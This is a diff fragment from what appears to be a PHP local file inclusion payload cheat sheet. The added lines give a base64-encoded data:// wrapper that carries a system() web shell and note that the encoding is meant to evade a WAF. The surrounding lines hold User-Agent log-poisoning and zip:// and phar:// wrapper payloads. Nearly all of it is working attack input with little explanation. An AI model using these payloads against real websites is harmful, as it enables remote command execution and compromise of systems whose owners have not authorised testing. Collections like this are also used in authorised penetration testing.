@@ -20,9 +20,10 @@ GET /index.php?file=/proc/self/environ&cmd=id HTTP/1.1
 Host: www.site.com
 User-Agent: <?php echo assert($_GET['cmd']);?>
 
+You can also encode the <?php echo system($_GET["cmd"]);?> to base64 to try and circumvent possible WAF
+GET /index.php?file=data://text/plain;base64,PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=dir"
 
 Zip and Phar wrappers
-
 index.php?file=zip://image.zip#shell.php
 index.php?file=phar://image.phar/shell.php
 
